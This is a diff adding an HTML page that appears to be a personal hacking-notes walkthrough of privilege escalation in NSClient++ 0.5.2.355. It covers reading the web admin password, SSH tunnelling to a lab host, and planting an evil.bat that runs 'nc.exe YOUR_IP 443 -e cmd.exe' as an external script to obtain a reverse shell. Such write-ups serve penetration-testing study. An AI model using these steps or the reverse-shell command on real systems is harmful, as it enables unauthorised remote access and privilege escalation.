@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>NSClient++ (TCP/8443)</h1>
+            <p> Software used for monitoring security cameras</p>
+        </div>
+        <div class="notion-body">
+            <h2>Privilege Escalation</h2>
+            <ul>
+                <h3>NSClient++ 0.5.2.355</h3>
+                <ul>
+                    <p>When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted. </p>
+                    <p>Steps to do so are listed</p>
+                    <p>1. Grab de administrator password which may be in the file<b>nsclient.ini</b> or can be obtained using the following command</p>
+                    <pre><code class="language-cmd">.\nscp.exe web -- password --display</code></pre>
+                    <p>2. Login into the web panel, you can do so by using https://TARGET_IP:8443 but this is likely to fail since the software blocks login attemps from outside of the local network. That way you must perform ssh port tunneling</p>
+                    <pre><code class="language-bash">ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184</code></pre>
+                    <p>This software is programmed very badly so in case the login page does not show in you will need to modify it and leave only, htt://localhost:8443/index.html</p>
+                    <p>3. Check that the following modules are enabled: <b>CheckExternalScripts, Scheduler</b> This is simple, in the top part there is a section dedicated to modules that give you that information </p>
+                    <p>4. Transfer the following binaries to the target machine, <a class="notion-link" href="https://eternallybored.org/misc/netcat/"> nc.exe </a> and evil.bat to the folder <b>C:\Temp</b>. You can use SCP to do so</p>
+                    <pre><code class="language-batch">@echo off
+    c:\temp\nc.exe YOUR_IP 443 -e cmd.exe</code></pre>
+                    <p>5. A the the script (evil.bat) to the NSClient++ script section, to do so go: Settings -> External Scripts -> Scripts -> +Add new</p>
+                    <p>Key: Anything, Value: c:\temp\evil.bat</p>
+                    <p>6. Open a NC session in you attacker machine</p>
+                    <p>7. Apply changes using the top bar options and reload the service using the option "Control" located at the top bar.</p>
+                    <p>Here a pop up will appear and disappear in a moment, in case it don't refresh page, and in case page is not responding you should restart machine and repeat all process</p>
+                    <p>On the other hand youll have achieved a reverse shell</p>
+                </ul>    
+
+                
+
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
